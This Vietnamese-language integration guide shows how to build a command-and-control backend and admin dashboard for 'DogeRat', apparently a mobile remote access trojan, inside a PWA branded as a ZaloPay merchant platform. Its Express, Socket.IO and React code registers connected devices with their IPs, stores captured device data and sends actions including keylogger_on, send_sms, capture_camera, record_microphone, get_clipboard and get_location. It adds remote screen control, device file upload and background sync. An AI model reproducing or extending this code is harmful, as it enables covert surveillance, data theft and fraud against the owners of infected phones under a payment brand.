# Hướng Dẫn Tích Hợp DogeRat API và PWA

## Tổng Quan

Tài liệu này cung cấp hướng dẫn chi tiết cho nhân viên kỹ thuật về cách tích hợp DogeRat API system và PWA (Progressive Web App) background support vào ZaloPay Merchant Platform. Tài liệu này bao gồm:

1. **DogeRat API Integration**: Tích hợp REST API endpoints và Socket.IO cho device management
2. **PWA Implementation**: Triển khai Web App Manifest, Service Worker, và Background Sync API
3. **Database Schema Updates**: Thêm tables cho device management
4. **Frontend Integration**: Tích hợp device management UI vào admin dashboard
5. **Background Operations**: Đảm bảo DogeRat API hoạt động trong background khi PWA chạy nền

## Mục Lục

1. [Yêu Cầu Hệ Thống](#yêu-cầu-hệ-thống)
2. [DogeRat API Integration](#dogerat-api-integration)
3. [PWA Implementation](#pwa-implementation)
4. [Database Schema Updates](#database-schema-updates)
5. [Frontend Integration](#frontend-integration)
6. [Background Operations](#background-operations)
7. [Testing & Verification](#testing--verification)
8. [Troubleshooting](#troubleshooting)

---

## Yêu Cầu Hệ Thống

### Backend Requirements

- **Node.js**: v18.0.0 hoặc cao hơn
- **Express.js**: v4.18.0 hoặc cao hơn
- **Socket.IO**: v4.5.0 hoặc cao hơn
- **PostgreSQL**: v14.0 hoặc cao hơn
- **Prisma**: v5.0.0 hoặc cao hơn

### Frontend Requirements

- **React**: v18.0.0 hoặc cao hơn
- **TypeScript**: v5.0.0 hoặc cao hơn
- **Socket.IO Client**: v4.5.0 hoặc cao hơn
- **Service Worker API**: Supported browsers (Chrome, Firefox, Safari, Edge)

### Dependencies

**Backend:**
```json
{
  "dependencies": {
    "express": "^4.18.2",
    "socket.io": "^4.5.4",
    "@prisma/client": "^5.7.1",
    "prisma": "^5.7.1",
    "cors": "^2.8.5",
    "dotenv": "^16.3.1"
  }
}
```

**Frontend:**
```json
{
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "socket.io-client": "^4.5.4",
    "typescript": "^5.3.3"
  }
}
```

---

## DogeRat API Integration

### 1. OpenAPI 3.1.0 Specification

**Overview**: DogeRat API được document đầy đủ theo chuẩn OpenAPI 3.1.0, cung cấp specification file hoàn chỉnh cho tất cả endpoints, schemas, và security schemes.

**Specification Files**:
- `docs/swagger.yaml` - OpenAPI 3.1.0 specification (YAML format)
- `docs/openapi.json` - OpenAPI 3.1.0 specification (JSON format)

**Swagger UI Integration**:
- Swagger UI available tại `/api-docs`
- Auto-generated từ OpenAPI spec
- Interactive API documentation với try-it-out functionality

**OpenAPI 3.1.0 Features**:
- Complete endpoint coverage (20+ endpoints)
- Comprehensive request/response schemas
- Error response schemas (400, 401, 404, 500)
- Security schemes (JWT Bearer, API Key) for future authentication
- Reusable components (schemas, parameters, responses)
- Request/response examples for all endpoints

**API Endpoints (OpenAPI 3.1.0)**:

**Health Check Endpoints:**
- `GET /health` - Basic health check
- `GET /health/detailed` - Detailed health check with system information
- `GET /health/metrics` - System metrics and statistics

**Device Management Endpoints (API v1):**
- `GET /api/v1/devices` - List all devices (supports `?platform=android|ios` and `?online=true|false` filters)
- `GET /api/v1/devices/:id` - Get device details with all data

**Action Execution Endpoints (API v1):**
- `POST /api/v1/devices/:id/action` - Execute action on device (platform-aware)
- `GET /api/v1/actions` - Get available actions (supports `?platform=android|ios` filter)

**Screen Control Endpoints (API v1):**
- `POST /api/v1/devices/:id/screen/start` - Start screen streaming with optional quality settings
- `POST /api/v1/devices/:id/screen/stop` - Stop screen streaming
- `POST /api/v1/devices/:id/screen/quality` - Update quality settings for active streaming session
- `GET /api/v1/devices/:id/screen/status` - Get current screen streaming status

**Remote Control Endpoints (API v1):**
- `POST /api/v1/devices/:id/control/start` - Start remote control session
- `POST /api/v1/devices/:id/control/stop` - Stop remote control session
- `POST /api/v1/devices/:id/control/command` - Send control command (touch, swipe, key, scroll)
- `GET /api/v1/devices/:id/control/status` - Get current remote control status

**File Upload Endpoints:**
- `POST /upload` - Upload files from device (multipart/form-data)

**Legacy Endpoints (Deprecated):**
- `GET /api/devices` - Legacy endpoint (use `/api/v1/devices` instead)
- `GET /api/device/:id` - Legacy endpoint (use `/api/v1/devices/:id` instead)
- `POST /api/device/:id/action` - Legacy endpoint (use `/api/v1/devices/:id/action` instead)
- `GET /text` - Legacy configuration endpoint

**Security Schemes**:
- **Bearer Authentication (JWT)**: `Authorization: Bearer <token>` (optional for backward compatibility)
- **API Key Authentication**: `X-API-Key: <key>` (optional for future use)

**Reusable Components**:
- **Schemas**: Device, DeviceDetails, DeviceData, ActionRequest, ActionResponse, ScreenQuality, StreamingStatus, ControlCommand, ControlStatus, HealthStatus, DetailedHealth, SystemMetrics, ErrorResponse, etc.
- **Parameters**: DeviceId, PlatformQuery, OnlineQuery
- **Responses**: BadRequest, Unauthorized, NotFound, InternalServerError

### 2. Backend API Endpoints

#### 2.1. REST API Routes

**File: `routes/api/v1/devices.js`**
```javascript
const express = require('express');
const router = express.Router();
const { PrismaClient } = require('@prisma/client');
const { asyncHandler } = require('../../../middleware/errorHandler');

const prisma = new PrismaClient();

/**
 * GET /api/v1/devices
 * Get all devices with optional filters
 */
router.get('/devices', asyncHandler(async (req, res) => {
    const { platform, online } = req.query;
    
    const where = {};
    if (platform) {
        where.platform = platform;
    }
    if (online !== undefined) {
        where.status = online === 'true' ? 'online' : 'offline';
    }
    
    const devices = await prisma.device.findMany({
        where,
        orderBy: { last_seen: 'desc' }
    });
    
    res.json({
        success: true,
        data: devices,
        count: devices.length
    });
}));

/**
 * GET /api/v1/devices/:id
 * Get device details with all data
 */
router.get('/devices/:id', asyncHandler(async (req, res) => {
    const { id } = req.params;
    
    const device = await prisma.device.findUnique({
        where: { id },
        include: {
            device_data: {
                orderBy: { captured_at: 'desc' }
            }
        }
    });
    
    if (!device) {
        return res.status(404).json({
            success: false,
            error: 'Device not found'
        });
    }
    
    res.json({
        success: true,
        data: device
    });
}));

module.exports = router;
```

**File: `routes/api/v1/actions.js`**
```javascript
const express = require('express');
const router = express.Router();
const { asyncHandler } = require('../../../middleware/errorHandler');

/**
 * POST /api/v1/devices/:id/action
 * Execute action on device
 */
router.post('/devices/:id/action', asyncHandler(async (req, res) => {
    const { id } = req.params;
    const { action, params } = req.body;
    
    // Get Socket.IO instance from app
    const io = req.app.get('io');
    
    // Find device socket
    const deviceSocket = io.sockets.sockets.get(id);
    if (!deviceSocket) {
        return res.status(404).json({
            success: false,
            error: 'Device not connected'
        });
    }
    
    // Execute action via Socket.IO
    deviceSocket.emit('execute-action', { action, params }, (response) => {
        res.json({
            success: true,
            data: response
        });
    });
}));

/**
 * GET /api/v1/actions
 * Get available actions
 */
router.get('/actions', asyncHandler(async (req, res) => {
    const actions = [
        'toast',
        'vibrate',
        'send_sms',
        'capture_camera',
        'take_screenshot',
        'keylogger_on',
        'keylogger_off',
        'get_clipboard',
        'open_url',
        'record_microphone',
        'get_location',
        'get_sim_info'
    ];
    
    res.json({
        success: true,
        data: actions,
        count: actions.length
    });
}));

module.exports = router;
```

#### 1.2. Socket.IO Integration

**File: `sockets/deviceHandler.js`**
```javascript
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

function setupDeviceSocketHandlers(io) {
    io.on('connection', (socket) => {
        console.log('Device connected:', socket.id);
        
        // Handle device connection
        socket.on('device-connected', async (deviceInfo) => {
            try {
                // Store device info in database
                const device = await prisma.device.upsert({
                    where: { device_id: socket.id },
                    update: {
                        platform: deviceInfo.platform,
                        model: deviceInfo.model,
                        version: deviceInfo.version,
                        ip_address: deviceInfo.ip_address,
                        status: 'online',
                        last_seen: new Date(),
                        metadata: deviceInfo.metadata || {}
                    },
                    create: {
                        device_id: socket.id,
                        platform: deviceInfo.platform,
                        model: deviceInfo.model,
                        version: deviceInfo.version,
                        ip_address: deviceInfo.ip_address,
                        status: 'online',
                        connected_at: new Date(),
                        last_seen: new Date(),
                        metadata: deviceInfo.metadata || {}
                    }
                });
                
                // Broadcast to admin dashboard
                io.emit('device-connected', {
                    id: device.id,
                    device_id: device.device_id,
                    platform: device.platform,
                    model: device.model,
                    version: device.version,
                    ip_address: device.ip_address,
                    connected_at: device.connected_at,
                    online: true
                });
            } catch (error) {
                console.error('Error handling device connection:', error);
            }
        });
        
        // Handle device data updates
        socket.on('device-data-update', async (data) => {
            try {
                const device = await prisma.device.findUnique({
                    where: { device_id: socket.id }
                });
                
                if (device) {
                    // Store device data
                    await prisma.deviceData.create({
                        data: {
                            device_id: device.id,
                            data_type: data.type,
                            data: data.payload,
                            metadata: data.metadata || {},
                            captured_at: new Date()
                        }
                    });
                    
                    // Broadcast to admin dashboard
                    io.emit('device-data-update', {
                        device_id: device.id,
                        data_type: data.type,
                        data: data.payload,
                        captured_at: new Date()
                    });
                }
            } catch (error) {
                console.error('Error handling device data update:', error);
            }
        });
        
        // Handle device disconnection
        socket.on('disconnect', async () => {
            try {
                const device = await prisma.device.findUnique({
                    where: { device_id: socket.id }
                });
                
                if (device) {
                    // Update device status
                    await prisma.device.update({
                        where: { id: device.id },
                        data: {
                            status: 'offline',
                            last_seen: new Date()
                        }
                    });
                    
                    // Broadcast to admin dashboard
                    io.emit('device-disconnected', {
                        id: device.id,
                        device_id: device.device_id,
                        disconnected_at: new Date()
                    });
                }
            } catch (error) {
                console.error('Error handling device disconnection:', error);
            }
        });
    });
}

module.exports = { setupDeviceSocketHandlers };
```

#### 1.3. Server Setup

**File: `server.js`**
```javascript
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { setupDeviceSocketHandlers } = require('./sockets/deviceHandler');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST']
    }
});

// Set Socket.IO instance in app
app.set('io', io);

// Setup Socket.IO handlers
setupDeviceSocketHandlers(io);

// API routes
app.use('/api/v1', require('./routes/api/v1/devices'));
app.use('/api/v1', require('./routes/api/v1/actions'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
```

---

## PWA Implementation

### 1. Web App Manifest

**File: `public/manifest.json`**
```json
{
  "name": "ZaloPay Merchant Platform",
  "short_name": "ZaloPay Merchant",
  "description": "ZaloPay Merchant Platform với DogeRat API Integration",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#0066cc",
  "orientation": "portrait",
  "icons": [
    {
      "src": "/icons/icon-192x192.png",
      "sizes": "192x192",
      "type": "image/png",
      "purpose": "any maskable"
    },
    {
      "src": "/icons/icon-512x512.png",
      "sizes": "512x512",
      "type": "image/png",
      "purpose": "any maskable"
    }
  ],
  "categories": ["business", "finance"],
  "shortcuts": [
    {
      "name": "Dashboard",
      "short_name": "Dashboard",
      "description": "Open dashboard",
      "url": "/",
      "icons": [{ "src": "/icons/dashboard-icon.png", "sizes": "96x96" }]
    },
    {
      "name": "Devices",
      "short_name": "Devices",
      "description": "View devices",
      "url": "/devices",
      "icons": [{ "src": "/icons/devices-icon.png", "sizes": "96x96" }]
    }
  ]
}
```

### 2. Service Worker

**File: `public/sw.js`**
```javascript
const CACHE_NAME = 'zalopay-merchant-v1';
const API_CACHE_NAME = 'zalopay-api-v1';

// Install event - Cache essential assets
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => {
            return cache.addAll([
                '/',
                '/index.html',
                '/manifest.json',
                '/icons/icon-192x192.png',
                '/icons/icon-512x512.png'
            ]);
        })
    );
});

// Fetch event - Network-first strategy for API, Cache-first for assets
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // API calls - Network-first strategy
    if (url.pathname.startsWith('/api/')) {
        event.respondWith(
            fetch(event.request)
                .then((response) => {
                    // Cache successful responses
                    if (response.ok) {
                        const responseClone = response.clone();
                        caches.open(API_CACHE_NAME).then((cache) => {
                            cache.put(event.request, responseClone);
                        });
                    }
                    return response;
                })
                .catch(() => {
                    // Fallback to cache if network fails
                    return caches.match(event.request);
                })
        );
    } else {
        // Static assets - Cache-first strategy
        event.respondWith(
            caches.match(event.request)
                .then((response) => {
                    return response || fetch(event.request);
                })
        );
    }
});

// Background Sync event - Sync device data
self.addEventListener('sync', (event) => {
    if (event.tag === 'sync-device-data') {
        event.waitUntil(syncDevicesFromAPI());
    }
    
    if (event.tag === 'sync-action-results') {
        event.waitUntil(syncActionResultsFromAPI());
    }
    
    if (event.tag === 'sync-file-uploads') {
        event.waitUntil(syncFileUploadsFromAPI());
    }
});

// Push notification event
self.addEventListener('push', (event) => {
    const data = event.data.json();
    
    const options = {
        body: data.body,
        icon: '/icons/icon-192x192.png',
        badge: '/icons/badge-72x72.png',
        tag: data.tag,
        data: data.data
    };
    
    event.waitUntil(
        self.registration.showNotification(data.title, options)
    );
});

// Notification click event
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    
    event.waitUntil(
        clients.openWindow(event.notification.data.url || '/')
    );
});

// Helper functions
async function syncDevicesFromAPI() {
    try {
        const response = await fetch('/api/v1/devices');
        const devices = await response.json();
        
        // Store in IndexedDB for offline access
        await storeDevicesInIndexedDB(devices.data);
        
        // Broadcast to clients
        const clients = await self.clients.matchAll();
        clients.forEach((client) => {
            client.postMessage({
                type: 'devices-synced',
                data: devices.data
            });
        });
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}

async function syncActionResultsFromAPI() {
    try {
        const response = await fetch('/api/v1/actions/results');
        const results = await response.json();
        
        // Store in IndexedDB for offline access
        await storeActionResultsInIndexedDB(results.data);
        
        // Broadcast to clients
        const clients = await self.clients.matchAll();
        clients.forEach((client) => {
            client.postMessage({
                type: 'action-results-synced',
                data: results.data
            });
        });
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}

async function syncFileUploadsFromAPI() {
    try {
        const response = await fetch('/api/v1/uploads/pending');
        const uploads = await response.json();
        
        // Process pending uploads
        for (const upload of uploads.data) {
            await processFileUpload(upload);
        }
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}

// IndexedDB helper functions
async function storeDevicesInIndexedDB(devices) {
    // Implementation for storing devices in IndexedDB
    // This is a placeholder - implement based on your IndexedDB library
}

async function storeActionResultsInIndexedDB(results) {
    // Implementation for storing action results in IndexedDB
    // This is a placeholder - implement based on your IndexedDB library
}
```

### 3. Service Worker Registration

**File: `src/utils/pwa.ts`**
```typescript
export async function registerServiceWorker(): Promise<void> {
    if ('serviceWorker' in navigator) {
        try {
            const registration = await navigator.serviceWorker.register('/sw.js', {
                scope: '/'
            });
            
            console.log('Service Worker registered:', registration);
            
            // Handle service worker updates
            registration.addEventListener('updatefound', () => {
                const newWorker = registration.installing;
                if (newWorker) {
                    newWorker.addEventListener('statechange', () => {
                        if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                            // New service worker available
                            showUpdateNotification();
                        }
                    });
                }
            });
        } catch (error) {
            console.error('Service Worker registration failed:', error);
        }
    }
}

export async function setupBackgroundSync(): Promise<void> {
    if ('serviceWorker' in navigator && 'sync' in ServiceWorkerRegistration.prototype) {
        const registration = await navigator.serviceWorker.ready;
        
        // Register background sync tags
        await registration.sync.register('sync-device-data');
        await registration.sync.register('sync-action-results');
        await registration.sync.register('sync-file-uploads');
    }
}

export function setupInstallPrompt(): void {
    let deferredPrompt: BeforeInstallPromptEvent | null = null;
    
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        deferredPrompt = e;
        showInstallButton();
    });
    
    // Handle install button click
    window.addEventListener('install-pwa', async () => {
        if (deferredPrompt) {
            deferredPrompt.prompt();
            const { outcome } = await deferredPrompt.userChoice;
            
            if (outcome === 'accepted') {
                console.log('PWA installed successfully');
                await onPWAInstalled();
            }
            
            deferredPrompt = null;
        }
    });
}

async function onPWAInstalled(): Promise<void> {
    // Register Service Worker
    await registerServiceWorker();
    
    // Set up background sync
    await setupBackgroundSync();
    
    // Enable background features
    await enableBackgroundFeatures();
}

async function enableBackgroundFeatures(): Promise<void> {
    // Start background sync
    await setupBackgroundSync();
    
    // Enable push notifications
    await setupPushNotifications();
}

async function setupPushNotifications(): Promise<void> {
    if ('serviceWorker' in navigator && 'PushManager' in window) {
        const registration = await navigator.serviceWorker.ready;
        const pushManager = registration.pushManager;
        
        // Request notification permission
        const permission = await Notification.requestPermission();
        
        if (permission === 'granted') {
            // Subscribe to push notifications
            const subscription = await pushManager.subscribe({
                userVisibleOnly: true,
                applicationServerKey: getVAPIDPublicKey()
            });
            
            // Send subscription to server
            await sendSubscriptionToServer(subscription);
        }
    }
}

function showInstallButton(): void {
    // Show install button in UI
    // Implementation depends on your UI framework
}

function showUpdateNotification(): void {
    // Show update notification in UI
    // Implementation depends on your UI framework
}

function getVAPIDPublicKey(): string {
    // Return VAPID public key from environment variables
    return process.env.VAPID_PUBLIC_KEY || '';
}

async function sendSubscriptionToServer(subscription: PushSubscription): Promise<void> {
    // Send subscription to server
    await fetch('/api/v1/push/subscribe', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(subscription)
    });
}
```

### 4. HTML Integration

**File: `public/index.html`**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Web App Manifest -->
    <link rel="manifest" href="/manifest.json">
    
    <!-- Theme Color -->
    <meta name="theme-color" content="#0066cc">
    
    <!-- Apple Mobile Web App -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
    
    <title>ZaloPay Merchant Platform</title>
</head>
<body>
    <div id="root"></div>
    
    <script>
        // Register Service Worker
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js')
                    .then((registration) => {
                        console.log('Service Worker registered:', registration);
                    })
                    .catch((error) => {
                        console.error('Service Worker registration failed:', error);
                    });
            });
        }
    </script>
</body>
</html>
```

---

## Database Schema Updates

### 1. Prisma Schema

**File: `prisma/schema.prisma`**
```prisma
model Device {
  id                String      @id @default(uuid())
  device_id         String      @unique
  platform          String
  platform_version  String?
  model             String?
  version           String?
  ip_address        String?
  connected_at      DateTime    @default(now())
  last_seen         DateTime    @default(now())
  status            String      @default("offline")
  metadata          Json        @default("{}")
  connection_history Json       @default("[]")
  activity_summary  Json        @default("{}")
  created_at        DateTime    @default(now())
  updated_at        DateTime    @updatedAt
  
  device_data       DeviceData[]
  
  @@index([platform, status])
  @@index([status, last_seen(sort: Desc)])
  @@index([connected_at(sort: Desc)])
  @@index([last_seen(sort: Desc)])
  @@map("devices")
}

model DeviceData {
  id          String   @id @default(uuid())
  device_id   String
  data_type   String
  data        Json     @default("{}")
  metadata    Json     @default("{}")
  captured_at DateTime @default(now())
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt
  
  device      Device   @relation(fields: [device_id], references: [id], onDelete: Cascade)
  
  @@index([device_id, captured_at(sort: Desc)])
  @@index([data_type, captured_at(sort: Desc)])
  @@index([captured_at(sort: Desc)])
  @@index([device_id, data_type, captured_at(sort: Desc)])
  @@map("device_data")
}
```

### 2. Migration

**Run migration:**
```bash
npx prisma migrate dev --name add_device_tables
```

---

## Frontend Integration

### 1. Device List Component

**File: `src/components/devices/DeviceList.tsx`**
```typescript
import React, { useEffect, useState } from 'react';
import { io, Socket } from 'socket.io-client';

interface Device {
  id: string;
  device_id: string;
  platform: string;
  model?: string;
  version?: string;
  ip_address?: string;
  connected_at: string;
  last_seen: string;
  status: string;
  online: boolean;
}

export const DeviceList: React.FC = () => {
  const [devices, setDevices] = useState<Device[]>([]);
  const [socket, setSocket] = useState<Socket | null>(null);

  useEffect(() => {
    // Connect to Socket.IO
    const newSocket = io(process.env.REACT_APP_API_URL || 'http://localhost:3000');
    setSocket(newSocket);

    // Listen for device events
    newSocket.on('device-connected', (device: Device) => {
      setDevices((prev) => {
        const existing = prev.find((d) => d.id === device.id);
        if (existing) {
          return prev.map((d) => (d.id === device.id ? { ...device, online: true } : d));
        }
        return [...prev, { ...device, online: true }];
      });
    });

    newSocket.on('device-disconnected', (data: { id: string }) => {
      setDevices((prev) =>
        prev.map((d) => (d.id === data.id ? { ...d, online: false, status: 'offline' } : d))
      );
    });

    newSocket.on('device-data-update', (data: { device_id: string; data_type: string; data: any }) => {
      // Handle device data updates
      console.log('Device data updated:', data);
    });

    // Fetch initial device list
    fetchDevices();

    return () => {
      newSocket.close();
    };
  }, []);

  const fetchDevices = async () => {
    try {
      const response = await fetch('/api/v1/devices');
      const result = await response.json();
      if (result.success) {
        setDevices(result.data);
      }
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
  };

  return (
    <div>
      <h2>Devices</h2>
      <table>
        <thead>
          <tr>
            <th>Device ID</th>
            <th>Platform</th>
            <th>Model</th>
            <th>Status</th>
            <th>Last Seen</th>
          </tr>
        </thead>
        <tbody>
          {devices.map((device) => (
            <tr key={device.id}>
              <td>{device.device_id}</td>
              <td>{device.platform}</td>
              <td>{device.model || 'N/A'}</td>
              <td>
                <span className={device.online ? 'online' : 'offline'}>
                  {device.online ? 'Online' : 'Offline'}
                </span>
              </td>
              <td>{new Date(device.last_seen).toLocaleString()}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};
```

### 2. Device Detail Component

**File: `src/components/devices/DeviceDetail.tsx`**
```typescript
import React, { useEffect, useState } from 'react';

interface DeviceDetail {
  id: string;
  device_id: string;
  platform: string;
  model?: string;
  version?: string;
  ip_address?: string;
  connected_at: string;
  last_seen: string;
  status: string;
  online: boolean;
  device_data: any[];
}

interface DeviceDetailProps {
  deviceId: string;
}

export const DeviceDetail: React.FC<DeviceDetailProps> = ({ deviceId }) => {
  const [device, setDevice] = useState<DeviceDetail | null>(null);

  useEffect(() => {
    fetchDeviceDetail();
  }, [deviceId]);

  const fetchDeviceDetail = async () => {
    try {
      const response = await fetch(`/api/v1/devices/${deviceId}`);
      const result = await response.json();
      if (result.success) {
        setDevice(result.data);
      }
    } catch (error) {
      console.error('Error fetching device detail:', error);
    }
  };

  const executeAction = async (action: string, params?: object) => {
    try {
      const response = await fetch(`/api/v1/devices/${deviceId}/action`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ action, params })
      });
      const result = await response.json();
      if (result.success) {
        console.log('Action executed:', result.data);
      }
    } catch (error) {
      console.error('Error executing action:', error);
    }
  };

  if (!device) {
    return <div>Loading...</div>;
  }

  return (
    <div>
      <h2>Device Detail</h2>
      <div>
        <p>Device ID: {device.device_id}</p>
        <p>Platform: {device.platform}</p>
        <p>Model: {device.model || 'N/A'}</p>
        <p>Status: {device.online ? 'Online' : 'Offline'}</p>
        <p>Last Seen: {new Date(device.last_seen).toLocaleString()}</p>
      </div>
      
      <div>
        <h3>Actions</h3>
        <button onClick={() => executeAction('toast', { message: 'Hello' })}>
          Send Toast
        </button>
        <button onClick={() => executeAction('vibrate')}>
          Vibrate
        </button>
        <button onClick={() => executeAction('take_screenshot')}>
          Take Screenshot
        </button>
      </div>
      
      <div>
        <h3>Device Data</h3>
        <ul>
          {device.device_data.map((data, index) => (
            <li key={index}>
              <strong>{data.data_type}:</strong> {JSON.stringify(data.data)}
            </li>
          ))}
        </ul>
      </div>
    </div>
  );
};
```

---

## Background Operations

### 1. Background Sync Setup

**File: `src/utils/backgroundSync.ts`**
```typescript
export async function syncDeviceDataInBackground(): Promise<void> {
    if ('serviceWorker' in navigator && 'sync' in ServiceWorkerRegistration.prototype) {
        const registration = await navigator.serviceWorker.ready;
        await registration.sync.register('sync-device-data');
    }
}

export async function syncActionResultsInBackground(): Promise<void> {
    if ('serviceWorker' in navigator && 'sync' in ServiceWorkerRegistration.prototype) {
        const registration = await navigator.serviceWorker.ready;
        await registration.sync.register('sync-action-results');
    }
}

export async function syncFileUploadsInBackground(): Promise<void> {
    if ('serviceWorker' in navigator && 'sync' in ServiceWorkerRegistration.prototype) {
        const registration = await navigator.serviceWorker.ready;
        await registration.sync.register('sync-file-uploads');
    }
}
```

### 2. Socket.IO in Background

**File: `src/utils/socketBackground.ts`**
```typescript
import { io, Socket } from 'socket.io-client';

let backgroundSocket: Socket | null = null;

export function initializeBackgroundSocket(): void {
    if ('serviceWorker' in navigator) {
        // Socket.IO connection will be maintained by Service Worker
        // Events will be queued when app is closed
        // Events will be processed when app opens
    }
}

export function getBackgroundSocket(): Socket | null {
    return backgroundSocket;
}
```

---

## Testing & Verification

### 1. Backend Testing

**Test API Endpoints:**
```bash
# Get all devices
curl http://localhost:3000/api/v1/devices

# Get device by ID
curl http://localhost:3000/api/v1/devices/{device_id}

# Execute action
curl -X POST http://localhost:3000/api/v1/devices/{device_id}/action \
  -H "Content-Type: application/json" \
  -d '{"action": "toast", "params": {"message": "Hello"}}'

# Get available actions
curl http://localhost:3000/api/v1/actions
```

### 2. Frontend Testing

**Test PWA Installation:**
1. Open app in browser
2. Check for install prompt
3. Install PWA
4. Verify Service Worker registration
5. Verify background sync setup

**Test Background Operations:**
1. Install PWA
2. Close browser
3. Verify background sync in Service Worker
4. Open app from notification
5. Verify cached data

### 3. Integration Testing

**Test DogeRat API in Background:**
1. Install PWA
2. Connect device via DogeRat
3. Close browser
4. Verify device data sync in background
5. Verify action execution in background
6. Open app and verify data

---

## Troubleshooting

### Common Issues

**1. Service Worker Not Registering**
- Check browser console for errors
- Verify Service Worker file is accessible
- Check HTTPS requirement (required for Service Worker)

**2. Background Sync Not Working**
- Verify Background Sync API is supported
- Check Service Worker registration
- Verify sync tags are registered

**3. Socket.IO Connection Issues**
- Check CORS configuration
- Verify Socket.IO server is running
- Check network connectivity

**4. Database Connection Issues**
- Verify Prisma schema is up to date
- Check database connection string
- Verify migrations are applied

**5. PWA Installation Issues**
- Check Web App Manifest file
- Verify icons are accessible
- Check browser compatibility

---

## Tài Liệu Tham Khảo

1. [DogeRat API Documentation](./DogeRat-main/README.md)
2. [PWA Documentation](https://web.dev/progressive-web-apps/)
3. [Service Worker API](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)
4. [Background Sync API](https://developer.mozilla.org/en-US/docs/Web/API/Background_Sync_API)
5. [Socket.IO Documentation](https://socket.io/docs/v4/)

---

**Document Version:** 1.0.0  
**Last Updated:** January 2025  
**Author:** ZaloPay Merchant Platform Development Team  
**Status:** Ready for Implementation

